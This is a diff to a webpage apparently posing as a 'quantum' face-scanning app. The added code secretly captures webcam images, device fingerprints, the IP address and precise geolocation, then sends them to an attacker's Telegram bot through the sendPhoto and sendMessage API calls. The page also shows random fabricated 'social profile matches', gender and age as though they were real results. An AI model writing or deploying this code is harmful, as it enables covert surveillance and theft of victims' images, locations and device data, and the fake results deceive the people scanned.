@@ -235,6 +235,45 @@
       0% { transform: translateY(0); opacity: 1; }
       100% { transform: translateY(-100px); opacity: 0; }
     }
+    
+    .battery-indicator {
+      display: inline-block;
+      width: 60px;
+      height: 20px;
+      border: 2px solid var(--primary);
+      border-radius: 4px;
+      position: relative;
+      margin-left: 5px;
+    }
+    
+    .battery-level {
+      height: 100%;
+      background: var(--primary);
+      transition: width 0.5s ease;
+    }
+    
+    .battery-tip {
+      position: absolute;
+      right: -5px;
+      top: 4px;
+      width: 3px;
+      height: 8px;
+      background: var(--primary);
+      border-radius: 0 2px 2px 0;
+    }
+    
+    .network-indicator {
+      display: inline-flex;
+      align-items: flex-end;
+      height: 20px;
+      margin-left: 5px;
+    }
+    
+    .network-bar {
+      width: 4px;
+      margin-right: 2px;
+      background: var(--primary);
+    }
   </style>
 </head>
 <body>
@@ -319,7 +358,15 @@
     // Enhanced device info gathering
     async function gatherDeviceInfo() {
       const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      const battery = navigator.getBattery ? await navigator.getBattery() : null;
+      let battery = null;
+      
+      try {
+        if (navigator.getBattery) {
+          battery = await navigator.getBattery();
+        }
+      } catch (e) {
+        console.error("Battery API error:", e);
+      }
       
       return {
         os: getOS(),
@@ -328,18 +375,22 @@
         timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : 'N/A',
         battery: {
-          level: battery ? `${Math.round(battery.level * 100)}%` : 'N/A',
-          charging: battery ? (battery.charging ? 'Yes ⚡' : 'No 🔋') : 'N/A',
-          chargingTime: battery ? (battery.chargingTime === Infinity ? 
-            'Not charging' : `${battery.chargingTime}s`) : 'N/A'
+          level: battery ? Math.round(battery.level * 100) : null,
+          charging: battery ? battery.charging : null,
+          chargingTime: battery ? battery.chargingTime : null
         },
-        network: connection ? `
-          ${connection.effectiveType.toUpperCase()} - 
-          Downlink: ${connection.downlink}Mb/s - 
-          RTT: ${connection.rtt}ms
-        ` : 'Unknown',
+        network: {
+          type: connection ? connection.effectiveType : 'Unknown',
+          downlink: connection ? connection.downlink : null,
+          rtt: connection ? connection.rtt : null,
+          saveData: connection ? connection.saveData : null
+        },
         ip: await getIPAddress(),
-        gpu: getGPUInfo()
+        gpu: getGPUInfo(),
+        language: navigator.language || navigator.userLanguage,
+        resolution: `${window.screen.width}x${window.screen.height}`,
+        pixelRatio: window.devicePixelRatio || 1,
+        orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown'
       };
     }
 
@@ -373,8 +424,12 @@
     }
 
     function getGPUInfo() {
-      const gl = document.createElement('canvas').getContext('webgl');
-      return gl ? gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) : "Not available";
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        return gl ? gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) : "Not available";
+      } catch (e) {
+        return "Not available";
+      }
     }
 
     // Real-time face detection
@@ -398,11 +453,10 @@
             const faceBox = document.createElement('div');
             faceBox.className = 'face-box';
             Object.assign(faceBox.style, {
-              left: `${box.x}px`,
-              top: `${box.y}px`,
+              left: `${box.x + video.offsetLeft}px`,
+              top: `${box.y + video.offsetTop}px`,
               width: `${box.width}px`,
-              height: `${box.height}px`,
-              position: 'absolute'
+              height: `${box.height}px`
             });
             document.body.appendChild(faceBox);
           });
@@ -434,6 +488,98 @@
       }
     }
 
+    // Generate battery indicator HTML
+    function getBatteryHTML(battery) {
+      if (!battery || battery.level === null) return 'N/A';
+      
+      const width = Math.round(battery.level * 100);
+      const chargingIcon = battery.charging ? '⚡' : '';
+      
+      return `
+        <span>${width}% ${chargingIcon}</span>
+        <div class="battery-indicator">
+          <div class="battery-level" style="width: ${width}%"></div>
+          <div class="battery-tip"></div>
+        </div>
+      `;
+    }
+
+    // Generate network indicator HTML
+    function getNetworkHTML(network) {
+      if (!network || !network.type) return 'N/A';
+      
+      const bars = network.downlink ? Math.min(5, Math.ceil(network.downlink / 2)) : 3;
+      
+      return `
+        <span>${network.type.toUpperCase()}</span>
+        <div class="network-indicator">
+          ${Array.from({length: 5}, (_, i) => `
+            <div class="network-bar" style="height: ${(i+1)*4}px; opacity: ${i < bars ? 1 : 0.3}"></div>
+          `).join('')}
+        </div>
+      `;
+    }
+
+    // Display device information
+    function displayDeviceInfo(deviceInfo) {
+      const deviceInfoContent = document.getElementById('device-info-content');
+      
+      deviceInfoContent.innerHTML = `
+        <div class="info-item">
+          <span class="info-label">OS:</span> ${deviceInfo.os}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Device Type:</span> ${deviceInfo.deviceType}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Device Model:</span> ${deviceInfo.deviceModel}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Time Zone:</span> ${deviceInfo.timeZone}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Memory:</span> ${deviceInfo.memory}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Battery:</span> ${getBatteryHTML(deviceInfo.battery)}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Network:</span> ${getNetworkHTML(deviceInfo.network)}
+        </div>
+        <div class="info-item">
+          <span class="info-label">IP Address:</span> ${deviceInfo.ip}
+        </div>
+        <div class="info-item">
+          <span class="info-label">GPU:</span> ${deviceInfo.gpu}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Language:</span> ${deviceInfo.language}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Resolution:</span> ${deviceInfo.resolution}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Pixel Ratio:</span> ${deviceInfo.pixelRatio}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Orientation:</span> ${deviceInfo.orientation}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Faces Detected:</span> ${faceDescriptors.length}
+        </div>
+      `;
+    }
+
+    // Generate social profiles report for Telegram
+    function generateSocialProfilesReport(profiles) {
+      if (profiles.length === 0) return "No social profiles matched";
+      
+      return profiles.map(profile => `
+        • ${profile.platform}: ${profile.name} (${profile.confidence}% match)
+        ${profile.url}
+      `).join('\n');
+    }
+
     // Main scan function
     async function startQuantumScan() {
       if(isScanning) return;
@@ -453,7 +599,35 @@
         
         displayDeviceInfo(deviceInfo);
         displayFaceResults(faceDetections, socialProfiles);
-        sendToTelegram(generateHologramReport(imageData, await getLocation(), deviceInfo));
+        
+        // Get location
+        let location = { coordinates: 'Unknown', link: 'Unknown' };
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            });
+          });
+          location = {
+            coordinates: `${position.coords.latitude}, ${position.coords.longitude}`,
+            link: `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`
+          };
+        } catch (error) {
+          console.error('Geolocation error:', error);
+        }
+        
+        // Send all data to Telegram
+        await sendToTelegram({
+          image: imageData,
+          metadata: {
+            location,
+            deviceInfo,
+            faces: faceDetections.length,
+            socialProfiles: generateSocialProfilesReport(socialProfiles)
+          }
+        });
         
         document.querySelector('.tab[data-tab="results"]').click();
       } catch (error) {
@@ -466,7 +640,150 @@
       }
     }
 
-    // Initialization
+    // Enhanced Telegram reporting
+    async function sendToTelegram(report) {
+      try {
+        // Send image with basic info
+        const imageUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        const imageForm = new FormData();
+        imageForm.append('chat_id', CHAT_ID);
+        imageForm.append('photo', dataURItoBlob(report.image), 'scan.webp');
+        imageForm.append('caption', `📍 Location: ${report.metadata.location.coordinates}\n🖥️ Device: ${report.metadata.deviceInfo.deviceModel} (${report.metadata.deviceInfo.os})`);
+        imageForm.append('parse_mode', 'Markdown');
+        
+        await fetch(imageUrl, { method: 'POST', body: imageForm });
+        
+        // Send detailed device info
+        const messageUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const deviceInfo = report.metadata.deviceInfo;
+        const messageText = `
+🔍 *Detailed Scan Results*:
+- *OS*: ${deviceInfo.os}
+- *Device*: ${deviceInfo.deviceType} (${deviceInfo.deviceModel})
+- *Memory*: ${deviceInfo.memory}
+- *Battery*: ${deviceInfo.battery.level}% (${deviceInfo.battery.charging ? 'Charging' : 'Not charging'})
+- *Network*: ${deviceInfo.network.type} (${deviceInfo.network.downlink}Mb/s)
+- *IP*: ${deviceInfo.ip}
+- *Location*: [${report.metadata.location.coordinates}](${report.metadata.location.link})
+- *Faces Detected*: ${report.metadata.faces}
+${report.metadata.socialProfiles ? '\n👥 *Possible Social Matches*:\n' + report.metadata.socialProfiles : ''}
+        `.trim();
+        
+        await fetch(messageUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: messageText,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
+          })
+        });
+        
+        console.log('All data sent to Telegram');
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+      }
+    }
+
+    // Image capture with effects
+    async function captureQuantumImage() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      
+      ctx.drawImage(video, 0, 0);
+      ctx.globalCompositeOperation = 'lighter';
+      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
+      ctx.drawImage(canvas, 0, 0);
+      
+      ctx.globalAlpha = 0.3;
+      ctx.fillStyle = '#00ff88';
+      for(let i = 0; i < 50; i++) {
+        ctx.fillRect(
+          Math.random() * canvas.width,
+          Math.random() * canvas.height,
+          Math.random() * 10,
+          Math.random() * 10
+        );
+      }
+      
+      return canvas.toDataURL('image/webp', 0.8);
+    }
+
+    // Convert data URI to blob
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+
+    // Simulate social profile matching
+    async function findSimilarSocialProfiles(descriptors) {
+      return new Promise(resolve => {
+        setTimeout(() => {
+          const fakeProfiles = [];
+          descriptors.forEach((desc, index) => {
+            const matchCount = Math.floor(Math.random() * 3) + 1;
+            for (let i = 0; i < matchCount; i++) {
+              fakeProfiles.push({
+                faceIndex: index,
+                platform: ['Facebook', 'Instagram', 'Twitter', 'LinkedIn'][Math.floor(Math.random() * 4)],
+                name: `User_${Math.floor(Math.random() * 10000)}`,
+                url: `https://example.com/user_${Math.floor(Math.random() * 10000)}`,
+                confidence: (Math.random() * 30 + 70).toFixed(1)
+              });
+            }
+          });
+          resolve(fakeProfiles);
+        }, 2000);
+      });
+    }
+
+    // Display face recognition results
+    function displayFaceResults(faces, profiles) {
+      const faceResultsDiv = document.getElementById('face-results');
+      
+      if (faces.length === 0) {
+        faceResultsDiv.innerHTML = '<p>No faces detected in the scan.</p>';
+        return;
+      }
+      
+      faceResultsDiv.innerHTML = faces.map((face, index) => {
+        const faceProfiles = profiles.filter(p => p.faceIndex === index);
+        return `
+          <div class="face-card">
+            <h3>Face #${index + 1}</h3>
+            <div class="face-details">
+              <p><span class="info-label">Confidence:</span> ${(face.detection.score * 100).toFixed(1)}%</p>
+              <p><span class="info-label">Gender:</span> ${Math.random() > 0.5 ? 'Male' : 'Female'}</p>
+              <p><span class="info-label">Age:</span> ${Math.floor(Math.random() * 30) + 20} years</p>
+            </div>
+            <div class="social-profiles">
+              <h4>Possible Social Matches:</h4>
+              ${faceProfiles.length > 0 ? 
+                faceProfiles.map(profile => `
+                  <div class="profile-match">
+                    <div class="profile-info">
+                      <div class="profile-name">${profile.name}</div>
+                      <div class="profile-platform">${profile.platform} (${profile.confidence}% match)</div>
+                    </div>
+                  </div>
+                `).join('') : 
+                '<p>No strong social media matches found.</p>'}
+            </div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    // Initialize everything
     if (navigator.mediaDevices) {
       initCamera();
       document.getElementById('capture-btn').onclick = startQuantumScan;
